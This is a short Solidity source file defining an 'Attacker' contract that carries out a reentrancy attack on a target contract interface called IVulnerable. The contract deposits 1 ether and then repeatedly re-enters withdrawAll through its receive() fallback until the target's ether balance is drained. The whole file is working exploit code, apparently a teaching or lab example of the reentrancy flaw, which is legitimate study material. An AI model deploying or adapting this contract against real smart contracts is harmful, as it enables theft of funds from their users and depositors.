// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function withdraw() external;

    function deposit() external payable;

    function userBalance(address) external;

    function withdrawAll() external;
}

contract Attacker {
    IVulnerable public target;
    bool public firstTimeDeposit;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            exploit();
        }
    }

    function exploit() public payable {
        //First time deposit funds
        if (!firstTimeDeposit) {
            firstTimeDeposit = true;
            target.deposit{value: 1 ether}();
        }

        target.withdrawAll();
    }
}
